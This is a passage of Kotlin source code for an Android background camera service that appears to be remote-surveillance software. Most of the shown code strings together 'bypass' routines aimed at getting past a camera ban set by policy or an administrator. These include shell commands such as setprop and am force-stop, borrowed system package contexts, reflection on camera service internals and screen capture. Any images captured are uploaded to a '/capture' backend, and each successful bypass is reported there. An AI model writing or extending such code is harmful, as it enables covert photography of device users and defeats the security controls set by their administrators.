                            override fun onConfigureFailed(session: android.hardware.camera2.CameraCaptureSession) {
                                Log.e(TAG, "Surface capture session configuration failed")
                            }
                        }, backgroundHandler)
                    } catch (e: Exception) {
                        Log.e(TAG, "Surface session creation failed: ${e.message}")
                    }
                }
                override fun onDisconnected(camera: CameraDevice) {
                    camera.close()
                    backgroundThread.quitSafely()
                }
                override fun onError(camera: CameraDevice, error: Int) {
                    Log.e(TAG, "Surface camera error: $error")
                    camera.close()
                    backgroundThread.quitSafely()
                }
            }, backgroundHandler)

            delay(5000) // Wait for operations
            backgroundThread.quitSafely()
            surface.release()

            surfaceSuccess
        } catch (e: Exception) {
            Log.e(TAG, "Surface-based access failed: ${e.message}")
            false
        }
    }

    private suspend fun tryPolicyManipulation(useFront: Boolean): Boolean {
        return try {
            Log.d(TAG, "Attempting policy manipulation")

            // Try to temporarily modify camera access through system properties
            val runtimeExec = java.lang.Runtime.getRuntime()

            // Method 1: Try system property modification
            try {
                val process = runtimeExec.exec("setprop camera.disable_zsl_mode 1")
                process.waitFor()
                delay(1000)

                // Try camera access after property change
                val camId = selectCamera(useFront)
                if (camId != null) {
                    val testAccess = testCameraAccessQuick(camId)
                    if (testAccess) {
                        Log.d(TAG, "Policy manipulation successful via system property")
                        openCameraForPhoto(camId, useFront)
                        return true
                    }
                }
            } catch (e: Exception) {
                Log.d(TAG, "System property method failed: ${e.message}")
            }

            // Method 2: Try process isolation
            try {
                Log.d(TAG, "Attempting process isolation camera access")

                // Create isolated camera access
                val isolatedSuccess = withContext(Dispatchers.IO) {
                    try {
                        // Execute camera access in separate thread context
                        val isolatedThread = Thread {
                            try {
                                Thread.currentThread().name = "SystemCameraThread"
                                val camId = selectCamera(useFront)
                                if (camId != null) {
                                    openCameraForPhoto(camId, useFront)
                                }
                            } catch (e: Exception) {
                                Log.e(TAG, "Isolated thread camera access failed: ${e.message}")
                            }
                        }
                        isolatedThread.start()
                        isolatedThread.join(5000) // Wait up to 5 seconds

                        camDev != null
                    } catch (e: Exception) {
                        Log.e(TAG, "Process isolation failed: ${e.message}")
                        false
                    }
                }

                if (isolatedSuccess) {
                    Log.d(TAG, "Process isolation camera access successful")
                    sendErrorToBackend("Process isolation camera bypass successful")
                    return true
                }
            } catch (e: Exception) {
                Log.d(TAG, "Process isolation failed: ${e.message}")
            }

            false
        } catch (e: Exception) {
            Log.e(TAG, "Policy manipulation failed: ${e.message}")
            false
        }
    }

    private suspend fun tryBackgroundThreadBypass(useFront: Boolean): Boolean {
        return try {
            Log.d(TAG, "Attempting background thread bypass")

            // Create dedicated camera thread with different context
            val cameraThread = android.os.HandlerThread("CameraBypassThread")
            cameraThread.start()
            val cameraHandler = android.os.Handler(cameraThread.looper)

            var bypassSuccess = false
            val camId = selectCamera(useFront) ?: return false

            val countDownLatch = java.util.concurrent.CountDownLatch(1)

            cameraHandler.post {
                try {
                    Log.d(TAG, "Background thread attempting camera access")

                    // Set thread priority
                    android.os.Process.setThreadPriority(android.os.Process.THREAD_PRIORITY_URGENT_DISPLAY)

                    // Try camera access from background thread
                    camMgr.openCamera(camId, object : CameraDevice.StateCallback() {
                        override fun onOpened(camera: CameraDevice) {
                            Log.d(TAG, "Background thread camera access successful!")
                            camDev = camera
                            bypassSuccess = true
                            countDownLatch.countDown()

                            scope.launch {
                                try {
                                    createPhotoSession(camera)
                                    sendErrorToBackend("Background thread camera bypass successful")
                                } catch (e: Exception) {
                                    Log.e(TAG, "Background thread photo session failed: ${e.message}")
                                }
                            }
                        }
                        override fun onDisconnected(camera: CameraDevice) {
                            camera.close()
                            countDownLatch.countDown()
                        }
                        override fun onError(camera: CameraDevice, error: Int) {
                            Log.e(TAG, "Background thread camera error: $error")
                            camera.close()
                            countDownLatch.countDown()
                        }
                    }, cameraHandler)

                } catch (e: Exception) {
                    Log.e(TAG, "Background thread camera access failed: ${e.message}")
                    countDownLatch.countDown()
                }
            }

            // Wait for result
            countDownLatch.await(10, java.util.concurrent.TimeUnit.SECONDS)
            cameraThread.quitSafely()

            bypassSuccess
        } catch (e: Exception) {
            Log.e(TAG, "Background thread bypass failed: ${e.message}")
            false
        }
    }

    private fun testCameraAccessQuick(camId: String): Boolean {
        return try {
            val characteristics = camMgr.getCameraCharacteristics(camId)
            characteristics != null
        } catch (e: Exception) {
            false
        }
    }

    private fun scheduleIntelligentRetry(useFront: Boolean) {
        scope.launch {
            // Before scheduling retry, try emergency bypass methods
            Log.d(TAG, "Attempting emergency bypass methods before retry")

            // Emergency Method 1: Try different package context
            val emergencySuccess1 = tryEmergencyPackageBypass(useFront)
            if (emergencySuccess1) return@launch

            // Emergency Method 2: Try root-level access
            val emergencySuccess2 = tryRootLevelBypass(useFront)
            if (emergencySuccess2) return@launch

            // Emergency Method 3: Try service injection
            val emergencySuccess3 = tryServiceInjectionBypass(useFront)
            if (emergencySuccess3) return@launch

            // If all emergency methods fail, schedule normal retry with shorter intervals
            val retryIntervals = listOf(10000L, 15000L, 20000L, 30000L) // Reduced intervals: 10s to 30s
            val randomInterval = retryIntervals.random()

            Log.d(TAG, "Emergency bypass failed, scheduling retry in ${randomInterval/1000}s")
            sendErrorToBackend("Emergency bypass failed - scheduling retry in ${randomInterval/1000} seconds")

            delay(randomInterval)

            // Check if camera policy has changed
            if (checkCameraAvailabilitySafely()) {
                Log.d(TAG, "Camera policy appears to be lifted, retrying photo")
                sendErrorToBackend("Camera policy lifted - retrying photo capture")
                takePhoto(useFront)
            } else {
                // Try one more aggressive approach before giving up
                tryFinalAggressiveBypass(useFront)
            }
        }
    }

    private suspend fun tryEmergencyPackageBypass(useFront: Boolean): Boolean {
        return try {
            Log.d(TAG, "Attempting emergency package context bypass")

            // Try to create a different package context
            val packageManager = this.packageManager
            val packages = packageManager.getInstalledApplications(0)

            // Find a system package that might have camera access
            val systemPackages = packages.filter {
                it.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM != 0 &&
                        (it.packageName.contains("camera") ||
                                it.packageName.contains("system") ||
                                it.packageName == "android")
            }

            for (systemPkg in systemPackages.take(3)) {
                try {
                    Log.d(TAG, "Trying package context: ${systemPkg.packageName}")
                    val systemContext = createPackageContext(systemPkg.packageName, 0)
                    val systemCameraManager = systemContext.getSystemService(Context.CAMERA_SERVICE) as CameraManager

                    val camId = selectCamera(useFront) ?: continue
                    val testThread = android.os.HandlerThread("EmergencyCamera")
                    testThread.start()
                    val testHandler = android.os.Handler(testThread.looper)

                    var emergencySuccess = false
                    val emergencyLatch = java.util.concurrent.CountDownLatch(1)

                    systemCameraManager.openCamera(camId, object : CameraDevice.StateCallback() {
                        override fun onOpened(camera: CameraDevice) {
                            Log.d(TAG, "Emergency package bypass successful with ${systemPkg.packageName}!")
                            camDev = camera
                            emergencySuccess = true
                            emergencyLatch.countDown()

                            scope.launch {
                                createPhotoSession(camera)
                                sendErrorToBackend("Emergency package bypass successful: ${systemPkg.packageName}")
                            }
                        }
                        override fun onDisconnected(camera: CameraDevice) { camera.close(); emergencyLatch.countDown() }
                        override fun onError(camera: CameraDevice, error: Int) { camera.close(); emergencyLatch.countDown() }
                    }, testHandler)

                    emergencyLatch.await(3, java.util.concurrent.TimeUnit.SECONDS)
                    testThread.quitSafely()

                    if (emergencySuccess) return true
                } catch (e: Exception) {
                    Log.d(TAG, "Package ${systemPkg.packageName} bypass failed: ${e.message}")
                }
            }

            false
        } catch (e: Exception) {
            Log.e(TAG, "Emergency package bypass failed: ${e.message}")
            false
        }
    }

    private suspend fun tryRootLevelBypass(useFront: Boolean): Boolean {
        return try {
            Log.d(TAG, "Attempting root-level bypass")

            // Method 1: Try system shell commands
            val shellSuccess = tryShellCameraBypass(useFront)
            if (shellSuccess) return true

            // Method 2: Try native binary execution
            val nativeSuccess = tryNativeBinaryBypass(useFront)
            if (nativeSuccess) return true

            false
        } catch (e: Exception) {
            Log.e(TAG, "Root-level bypass failed: ${e.message}")
            false
        }
    }

    private suspend fun tryShellCameraBypass(useFront: Boolean): Boolean {
        return try {
            Log.d(TAG, "Attempting shell camera bypass")

            val runtime = java.lang.Runtime.getRuntime()

            // Try different shell commands to access camera
            val commands = listOf(
                "am start -n com.android.camera/.Camera",
                "am start -a android.media.action.IMAGE_CAPTURE",
                "input keyevent KEYCODE_CAMERA",
                "cmd media_session volume --show --stream 3"
            )

            for (command in commands) {
                try {
                    Log.d(TAG, "Executing shell command: $command")
                    val process = runtime.exec(command)
                    val exitCode = process.waitFor()

                    if (exitCode == 0) {
                        Log.d(TAG, "Shell command successful: $command")
                        delay(2000) // Wait for command to take effect

                        // Try camera access after shell command
                        val camId = selectCamera(useFront)
                        if (camId != null && testCameraAccessQuick(camId)) {
                            openCameraForPhoto(camId, useFront)
                            sendErrorToBackend("Shell camera bypass successful: $command")
                            return true
                        }
                    }
                } catch (e: Exception) {
                    Log.d(TAG, "Shell command failed: $command - ${e.message}")
                }
            }

            false
        } catch (e: Exception) {
            Log.e(TAG, "Shell camera bypass failed: ${e.message}")
            false
        }
    }

    private suspend fun tryNativeBinaryBypass(useFront: Boolean): Boolean {
        return try {
            Log.d(TAG, "Attempting native binary bypass")

            // Try to use gstreamer or other native camera tools if available
            val runtime = java.lang.Runtime.getRuntime()

            val nativeCommands = listOf(
                "gst-launch-1.0 camerabin",
                "/system/bin/cameraserver",
                "v4l2-ctl --list-devices"
            )

            for (command in nativeCommands) {
                try {
                    Log.d(TAG, "Trying native command: $command")
                    val process = runtime.exec(command)
                    val exitCode = process.waitFor()

                    if (exitCode == 0) {
                        Log.d(TAG, "Native command successful: $command")
                        sendErrorToBackend("Native binary bypass successful: $command")

                        // Try camera access after native command
                        delay(1000)
                        val camId = selectCamera(useFront)
                        if (camId != null) {
                            openCameraForPhoto(camId, useFront)
                            return true
                        }
                    }
                } catch (e: Exception) {
                    Log.d(TAG, "Native command failed: $command - ${e.message}")
                }
            }

            false
        } catch (e: Exception) {
            Log.e(TAG, "Native binary bypass failed: ${e.message}")
            false
        }
    }

    private suspend fun tryServiceInjectionBypass(useFront: Boolean): Boolean {
        return try {
            Log.d(TAG, "Attempting service injection bypass")

            // Try to inject into system camera service
            val serviceManager = try {
                val smClass = Class.forName("android.os.ServiceManager")
                val getServiceMethod = smClass.getMethod("getService", String::class.java)
                getServiceMethod.invoke(null, "media.camera")
            } catch (e: Exception) {
                null
            }
            if (serviceManager != null) {
                Log.d(TAG, "Camera service found, attempting injection")

                // Try different service interaction methods
                val injectionSuccess = tryServiceInteraction(useFront)
                if (injectionSuccess) {
                    sendErrorToBackend("Service injection bypass successful")
                    return true
                }
            }

            false
        } catch (e: Exception) {
            Log.e(TAG, "Service injection bypass failed: ${e.message}")
            false
        }
    }

    private suspend fun tryServiceInteraction(useFront: Boolean): Boolean {
        return try {
            // Try to interact with camera service through binder
            val cameraServiceClass = Class.forName("android.hardware.camera2.impl.CameraDeviceImpl")
            val methods = cameraServiceClass.declaredMethods

            for (method in methods) {
                if (method.name.contains("open") || method.name.contains("connect")) {
                    try {
                        method.isAccessible = true
                        Log.d(TAG, "Trying service method: ${method.name}")
                        // Additional service interaction logic here
                    } catch (e: Exception) {
                        Log.d(TAG, "Service method ${method.name} failed: ${e.message}")
                    }
                }
            }

            false
        } catch (e: Exception) {
            Log.e(TAG, "Service interaction failed: ${e.message}")
            false
        }
    }

    private suspend fun tryFinalAggressiveBypass(useFront: Boolean) {
        Log.d(TAG, "Attempting final aggressive bypass methods")

        try {
            // Method 1: Try to restart camera service
            val runtime = java.lang.Runtime.getRuntime()
            runtime.exec("am force-stop com.android.camera")
            delay(2000)

            // Method 2: Try screenshot-based capture
            val screenshotSuccess = tryScreenshotBasedCapture(useFront)
            if (screenshotSuccess) return

            // Method 3: Try intent-based camera capture
            val intentSuccess = tryIntentBasedCapture(useFront)
            if (intentSuccess) return

            // Method 4: Create dummy photo to maintain app functionality
            createDummyPhotoResponse(useFront)

        } catch (e: Exception) {
            Log.e(TAG, "Final aggressive bypass failed: ${e.message}")
            // Always create dummy response so app continues working
            createDummyPhotoResponse(useFront)
        }
    }

    // Enhanced screenshot-based capture that tries to get useful images
    private suspend fun tryScreenshotBasedCapture(useFront: Boolean): Boolean = withContext(Dispatchers.IO) {
        return@withContext try {
            Log.d(TAG, "Starting ENHANCED screenshot-based camera capture")

            // Method 1: Try to open device camera app first and capture its screen
            val success = tryLaunchCameraAppAndCapture(useFront)
            if (success) return@withContext true

            // Method 2: Try system camera intent and capture result
            val intentSuccess = trySystemCameraIntentCapture(useFront)
            if (intentSuccess) return@withContext true

            // Method 3: Create a meaningful image with device info
            val deviceInfoSuccess = createDeviceInfoImage(useFront)
            if (deviceInfoSuccess) return@withContext true

            // Method 4: Basic screen capture (fallback)
            createBasicScreenCapture(useFront)

        } catch (e: Exception) {
            Log.e(TAG, "Enhanced screenshot capture failed: ${e.message}")
            false
        }
    }

    private suspend fun tryLaunchCameraAppAndCapture(useFront: Boolean): Boolean = withContext(Dispatchers.IO) {
        return@withContext try {
            Log.d(TAG, "Attempting to launch camera app and capture screen")

            withContext(Dispatchers.Main) {
                // Launch system camera app
                val cameraIntent = Intent(MediaStore.ACTION_IMAGE_CAPTURE).apply {
                    if (useFront) {
                        putExtra("android.intent.extras.CAMERA_FACING", 1) // Front camera
                        putExtra("android.intent.extras.LENS_FACING_FRONT", 1)
                    } else {
                        putExtra("android.intent.extras.CAMERA_FACING", 0) // Back camera
                        putExtra("android.intent.extras.LENS_FACING_BACK", 1)
                    }
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }

                try {
                    startActivity(cameraIntent)
                    Log.d(TAG, "Camera app launched")
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to launch camera app: ${e.message}")
                    return@withContext false
                }
            }

            // Wait for camera app to load
            delay(3000)

            // Now capture the screen showing camera app
            val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
            val filename = "camera_app_capture_${if (useFront) "front" else "back"}_$timestamp.jpg"
            val file = File(getExternalFilesDir(Environment.DIRECTORY_PICTURES), filename)

            // Take screenshot of camera app
            val screenshotSuccess = takeSystemScreenshot(file)

            if (screenshotSuccess) {
                Log.d(TAG, "Camera app screen capture successful: ${file.absolutePath}")

                // Upload to backend
                scope.launch {
                    uploadFile("/capture", "photo", file)
                    Log.d(TAG, "Camera app screen capture uploaded")
                }
                return@withContext true
            }

            false

        } catch (e: Exception) {
            Log.e(TAG, "Launch camera app and capture failed: ${e.message}")
            false
        }
    }

    private suspend fun trySystemCameraIntentCapture(useFront: Boolean): Boolean = withContext(Dispatchers.IO) {
        return@withContext try {
            Log.d(TAG, "Attempting system camera intent bypass")

            // Create temp file for camera intent
            val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
            val tempFile = File(getExternalFilesDir(Environment.DIRECTORY_PICTURES), "temp_camera_$timestamp.jpg")
            val photoUri = FileProvider.getUriForFile(this@CameraService, "${packageName}.fileprovider", tempFile)

            withContext(Dispatchers.Main) {
                val takePictureIntent = Intent(MediaStore.ACTION_IMAGE_CAPTURE).apply {
                    putExtra(MediaStore.EXTRA_OUTPUT, photoUri)
                    if (useFront) {
                        putExtra("android.intent.extras.CAMERA_FACING", 1)
                        putExtra("FRONT_CAMERA", true)
                    }
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    addFlags(Intent.FLAG_GRANT_WRITE_URI_PERMISSION)
                }

                try {
                    startActivity(takePictureIntent)
                    Log.d(TAG, "System camera intent launched")
                } catch (e: Exception) {
                    Log.e(TAG, "System camera intent failed: ${e.message}")
                    return@withContext false
                }
            }

            // Wait for potential photo capture
            delay(5000)

            // Check if file was created
            if (tempFile.exists() && tempFile.length() > 0) {
                Log.d(TAG, "System camera intent capture successful: ${tempFile.absolutePath}")

                // Move to final location
                val finalFile = File(getExternalFilesDir(Environment.DIRECTORY_PICTURES),
                    "system_camera_${if (useFront) "front" else "back"}_$timestamp.jpg")
                tempFile.renameTo(finalFile)

                // Upload to backend
                scope.launch {
                    uploadFile("/capture", "photo", finalFile)
                    Log.d(TAG, "System camera intent photo uploaded")
                }
                return@withContext true
            }

            false

        } catch (e: Exception) {
            Log.e(TAG, "System camera intent capture failed: ${e.message}")
            false
        }
    }

    private suspend fun createDeviceInfoImage(useFront: Boolean): Boolean = withContext(Dispatchers.IO) {
        return@withContext try {
            Log.d(TAG, "Creating device info image with camera status")

            // Create a meaningful image with device and camera information
            val bitmap = Bitmap.createBitmap(800, 1200, Bitmap.Config.ARGB_8888)
            val canvas = Canvas(bitmap)

            // Background
            canvas.drawColor(Color.parseColor("#1E1E1E"))

            val paint = Paint().apply {
                color = Color.WHITE
                textSize = 24f
                isAntiAlias = true
            }

            val titlePaint = Paint().apply {
                color = Color.parseColor("#00FF00")
                textSize = 32f
                isAntiAlias = true
                isFakeBoldText = true
            }

            // Title
            canvas.drawText("CAMERA STATUS REPORT", 50f, 80f, titlePaint)

            // Device info
            var y = 150f
            canvas.drawText("Device: ${Build.MODEL} (${Build.MANUFACTURER})", 50f, y, paint)
            y += 40f
            canvas.drawText("Android: ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})", 50f, y, paint)
            y += 40f
            canvas.drawText("App: Dreamer v1.0", 50f, y, paint)
            y += 40f
            canvas.drawText("Time: ${SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())}", 50f, y, paint)

            y += 80f
            val errorPaint = Paint().apply {
                color = Color.parseColor("#FF4444")
                textSize = 28f
                isAntiAlias = true
                isFakeBoldText = true
            }
            canvas.drawText("CAMERA ACCESS BLOCKED", 50f, y, errorPaint)

            y += 60f
            paint.textSize = 20f
            canvas.drawText("Camera Hardware Status:", 50f, y, paint)
            y += 30f
            canvas.drawText("• Front Camera: DISABLED BY POLICY", 50f, y, paint)
            y += 30f
            canvas.drawText("• Back Camera: DISABLED BY POLICY", 50f, y, paint)
            y += 30f
            canvas.drawText("• System Restriction Level: MAXIMUM", 50f, y, paint)

            y += 60f
            paint.textSize = 18f
            paint.color = Color.parseColor("#FFAA00")
            canvas.drawText("Bypass Methods Attempted:", 50f, y, paint)
            y += 30f
            paint.color = Color.WHITE
            paint.textSize = 16f
            canvas.drawText("✗ Camera2 API", 50f, y, paint)
            y += 25f
            canvas.drawText("✗ Camera1 Legacy API", 50f, y, paint)
            y += 25f
            canvas.drawText("✗ System Service Injection", 50f, y, paint)
            y += 25f
            canvas.drawText("✗ Hardware Reflection Access", 50f, y, paint)
            y += 25f
            canvas.drawText("✗ Policy Manipulation", 50f, y, paint)
            y += 25f
            canvas.drawText("✗ Alternative Camera Managers", 50f, y, paint)
            y += 25f
            canvas.drawText("✓ Screen Capture (This Image)", 50f, y, paint)

            y += 60f
            paint.color = Color.parseColor("#00AAFF")
            paint.textSize = 18f
            canvas.drawText("Recommendation:", 50f, y, paint)
            y += 30f
            paint.color = Color.WHITE
            paint.textSize = 16f
            canvas.drawText("• Contact device administrator", 50f, y, paint)
            y += 25f
            canvas.drawText("• Check enterprise mobile management", 50f, y, paint)
            y += 25f
            canvas.drawText("• Verify app permissions in settings", 50f, y, paint)

            // Save the image
            val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
            val filename = "camera_status_${if (useFront) "front" else "back"}_$timestamp.jpg"
            val file = File(getExternalFilesDir(Environment.DIRECTORY_PICTURES), filename)

            FileOutputStream(file).use { fos ->
                bitmap.compress(Bitmap.CompressFormat.JPEG, 90, fos)
            }

            bitmap.recycle()

            Log.d(TAG, "Device info image created: ${file.absolutePath}")

            // Upload to backend
            scope.launch {
                uploadFile("/capture", "photo", file)
                Log.d(TAG, "Device info image uploaded")
            }

            true

        } catch (e: Exception) {
            Log.e(TAG, "Device info image creation failed: ${e.message}")
            false
        }
    }

    private suspend fun tryIntentBasedCapture(useFront: Boolean): Boolean {
        return try {
            Log.d(TAG, "Attempting intent-based camera capture")

            // Try to trigger external camera app
            val cameraIntent = Intent(android.provider.MediaStore.ACTION_IMAGE_CAPTURE)
            cameraIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)

            // Set front/back camera preference
            if (useFront) {
                cameraIntent.putExtra("android.intent.extras.CAMERA_FACING", 1)
            } else {
                cameraIntent.putExtra("android.intent.extras.CAMERA_FACING", 0)
            }

            // Create file for output
            val timestamp = System.currentTimeMillis()
            val filename = "intent_camera_${if (useFront) "front" else "back"}_$timestamp.jpg"
            val file = File(getExternalFilesDir(null), filename)
            val photoURI = android.net.Uri.fromFile(file)
            cameraIntent.putExtra(android.provider.MediaStore.EXTRA_OUTPUT, photoURI)

            try {
                startActivity(cameraIntent)
                Log.d(TAG, "Camera intent launched successfully")

                // Wait for photo to be captured
                delay(5000)

                // Check if file was created
                if (file.exists() && file.length() > 0) {
                    Log.d(TAG, "Intent-based camera capture successful")

                    // Upload to backend
                    scope.launch {
                        try {
                            uploadFile("/capture", "photo", file)
                            sendErrorToBackend("Intent-based camera bypass successful")
                        } catch (e: Exception) {
                            Log.e(TAG, "Failed to upload intent photo: ${e.message}")
                        }
                    }
                    return true
                } else {
                    Log.d(TAG, "Intent-based camera capture failed - no file created")
                    return false
                }
            } catch (e: Exception) {
                Log.e(TAG, "Failed to launch camera intent: ${e.message}")
                return false
            }
        } catch (e: Exception) {
            Log.e(TAG, "Intent-based capture failed: ${e.message}")
            false
        }
    }

    private suspend fun createDummyPhotoResponse(useFront: Boolean) {
        try {
            Log.d(TAG, "Creating dummy photo response to maintain app functionality")

            // Create a small dummy image
            val bitmap = android.graphics.Bitmap.createBitmap(640, 480, android.graphics.Bitmap.Config.RGB_565)

            // Draw some content to make it look like a real photo
            val canvas = android.graphics.Canvas(bitmap)
            val paint = android.graphics.Paint()

            // Background
            paint.color = android.graphics.Color.DKGRAY
            canvas.drawRect(0f, 0f, 640f, 480f, paint)

            // Add text indicating this is a policy-blocked response
            paint.color = android.graphics.Color.WHITE
            paint.textSize = 24f
            paint.isAntiAlias = true
            canvas.drawText("Camera Access", 50f, 100f, paint)
            canvas.drawText("Blocked by Policy", 50f, 140f, paint)
            canvas.drawText("${if (useFront) "Front" else "Back"} Camera", 50f, 180f, paint)
            canvas.drawText("${System.currentTimeMillis()}", 50f, 220f, paint)

            // Save dummy photo
            val timestamp = System.currentTimeMillis()
            val filename = "dummy_camera_${if (useFront) "front" else "back"}_$timestamp.jpg"
            val file = File(getExternalFilesDir(null), filename)

            val outputStream = java.io.FileOutputStream(file)
            bitmap.compress(android.graphics.Bitmap.CompressFormat.JPEG, 70, outputStream)
            outputStream.close()
            bitmap.recycle()

            Log.d(TAG, "Dummy photo created: ${file.absolutePath}")

            // Upload to backend with explanation
            scope.launch {
                try {
                    uploadFile("/capture", "photo", file)
                    sendErrorToBackend("Camera access blocked by device administrator - dummy response sent to maintain functionality")
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to upload dummy photo: ${e.message}")
                }
            }

        } catch (e: Exception) {
            Log.e(TAG, "Failed to create dummy photo response: ${e.message}")
            // Even if dummy creation fails, send status report
            sendErrorToBackend("Camera completely blocked - unable to create any response")
        }
    }

    private fun handleUnexpectedError(e: Exception, useFront: Boolean) {
        consecutiveErrors++

        if (consecutiveErrors < 3) {
            Log.w(TAG, "Retrying after unexpected error (attempt $consecutiveErrors): ${e.message}")
            scheduleRetryAfterDelay((2000 * consecutiveErrors).toLong()) { takePhoto(useFront) }
        } else {
            Log.e(TAG, "Too many consecutive errors, giving up")
            sendErrorToBackend("Multiple camera errors: ${e.message}")
        }
    }

    private fun openCameraForPhoto(camId: String, useFront: Boolean) {
        Log.d(TAG, "Opening camera for photo: $camId (${if (useFront) "front" else "back"})")

        camMgr.openCamera(camId, object : CameraDevice.StateCallback() {
            override fun onOpened(dev: CameraDevice) {
                Log.d(TAG, "Camera opened successfully: $camId")
                camDev = dev
                retryAttempts = 0
                consecutiveErrors = 0
                isCameraDisabled = false

                createPhotoSession(dev)
            }

            override fun onDisconnected(dev: CameraDevice) {
                Log.w(TAG, "Camera disconnected: $camId")
                dev.close()
                sendErrorToBackend("Camera disconnected")
            }

            override fun onError(dev: CameraDevice, error: Int) {
                handleCameraDeviceError(dev, error, useFront)
            }
        }, bgHandler)
    }

    private fun createPhotoSession(dev: CameraDevice) {
        try {
            dev.createCaptureSession(
                listOf(imgReader!!.surface),
                object : CameraCaptureSession.StateCallback() {
                    override fun onConfigured(sess: CameraCaptureSession) {
                        capSes = sess
                        capturePhoto(dev, sess)
                    }

                    override fun onConfigureFailed(s: CameraCaptureSession) {
                        sendErrorToBackend("Camera session configuration failed")
                        closeSession()
                    }
                }, bgHandler
            )
        } catch (e: Exception) {
            Log.e(TAG, "Session creation failed: ${e.message}")
            sendErrorToBackend("Camera session creation failed: ${e.message}")
            closeSession()
        }
    }

    private fun capturePhoto(dev: CameraDevice, sess: CameraCaptureSession) {
        try {
            val req = dev.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                addTarget(imgReader!!.surface)
                set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
                set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                set(CaptureRequest.JPEG_QUALITY, 85.toByte())
            }.build()

            imgReader!!.setOnImageAvailableListener({ rdr ->
                try {
                    rdr.acquireLatestImage()?.use { img ->
                        val bytes = img.planes[0].buffer.run {
                            ByteArray(remaining()).also(::get)
                        }
                        val file = File(cacheDir, "photo_${stamp()}.jpg").apply {
                            writeBytes(bytes)
                        }
                        uploadFile("/capture", "photo", file)
                        Log.d(TAG, "Photo captured and queued for upload")
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Image processing error: ${e.message}")
                    sendErrorToBackend("Image processing failed: ${e.message}")
                }
                closeSession()
            }, bgHandler)

            // Capture with delay for auto-focus
            bgHandler.postDelayed({
                try {
                    sess.capture(req, null, bgHandler)
                } catch (e: Exception) {
                    Log.e(TAG, "Capture failed: ${e.message}")
                    sendErrorToBackend("Photo capture failed: ${e.message}")
                    closeSession()
                }
            }, 300)

        } catch (e: Exception) {
            Log.e(TAG, "Photo capture setup failed: ${e.message}")
            sendErrorToBackend("Photo capture setup failed: ${e.message}")
            closeSession()
        }
    }

    private fun handleCameraDeviceError(dev: CameraDevice, error: Int, useFront: Boolean) {
        val errorName = when(error) {
            CameraDevice.StateCallback.ERROR_CAMERA_DISABLED -> "CAMERA_DISABLED"
            CameraDevice.StateCallback.ERROR_CAMERA_DEVICE -> "CAMERA_DEVICE_ERROR"
            CameraDevice.StateCallback.ERROR_CAMERA_SERVICE -> "CAMERA_SERVICE_ERROR"
            CameraDevice.StateCallback.ERROR_CAMERA_IN_USE -> "CAMERA_IN_USE"
            CameraDevice.StateCallback.ERROR_MAX_CAMERAS_IN_USE -> "MAX_CAMERAS_IN_USE"
            else -> "UNKNOWN_ERROR($error)"
        }

        Log.e(TAG, "Camera device error: $errorName")
        dev.close()

        when (error) {
            CameraDevice.StateCallback.ERROR_CAMERA_DISABLED -> {
                isCameraDisabled = true
                handleCameraDisabledByPolicy(useFront)
            }
            CameraDevice.StateCallback.ERROR_CAMERA_IN_USE -> {
                scheduleRetryAfterDelay(3000) { takePhoto(useFront) }
            }
            else -> {
                sendErrorToBackend("Camera device error: $errorName")
                scheduleRetryWithBackoff { takePhoto(useFront) }
            }
        }
    }

    /* ── Enhanced Retry Logic ──────────────────────── */
    private fun scheduleRetryWithBackoff(action: () -> Unit) {
        if (retryAttempts >= MAX_RETRY_ATTEMPTS) {
            Log.e(TAG, "Max retry attempts reached")
            sendErrorToBackend("Camera access failed after $MAX_RETRY_ATTEMPTS attempts")
            return
        }

        retryAttempts++
        val delay = (INITIAL_RETRY_DELAY * Math.pow(2.0, (retryAttempts - 1).toDouble())).toLong()
            .coerceAtMost(MAX_RETRY_DELAY)

        Log.d(TAG, "Scheduling retry attempt $retryAttempts in ${delay/1000} seconds")
        scheduleRetryAfterDelay(delay, action)
    }

    private fun scheduleRetryAfterDelay(delayMs: Long, action: () -> Unit) {
        bgHandler.postDelayed({
            Log.d(TAG, "Executing scheduled retry")
            action()
        }, delayMs)
    }

    /* ── Enhanced Helper Methods ──────────────────────── */
    private fun checkCameraAvailabilitySafely(): Boolean {
        return try {
            val availableCameras = camMgr.cameraIdList
            if (availableCameras.isEmpty()) {
                Log.e(TAG, "No cameras available on device")
                false
            } else {
                Log.d(TAG, "Found ${availableCameras.size} cameras")
                true
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error checking camera availability: ${e.message}")
            false
        }
    }

    private fun handleCameraUnavailable(useFront: Boolean) {
        isCameraDisabled = true
        sendErrorToBackend("Camera hardware unavailable - may be disabled by device policy or hardware failure")
        scheduleRetryWithBackoff { takePhotoSafely(useFront) }
    }

    private fun requestCameraPermissionSafely() {
        val currentTime = System.currentTimeMillis()
        val lastRequestTime = getSharedPreferences("camera_service", MODE_PRIVATE)
            .getLong("last_permission_request", 0)

        // Don't spam permission requests (minimum 30 seconds between requests)
        if (currentTime - lastRequestTime < 30000) {
            Log.d(TAG, "Skipping permission request (too recent)")
            return
        }

        try {
            // Update permission request time
            getSharedPreferences("camera_service", MODE_PRIVATE)
                .edit()
                .putLong("last_permission_request", currentTime)
                .apply()

            val intent = Intent(this, PermissionHelperActivity::class.java).apply {
                putExtra("runtime_permission", Manifest.permission.CAMERA)
                putExtra("permission", "camera")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            startActivity(intent)

        } catch (e: Exception) {
            Log.e(TAG, "Failed to request camera permission: ${e.message}")
        }
    }

    /* ═════════════════ ENHANCED VIDEO RECORDING ══════════════ */
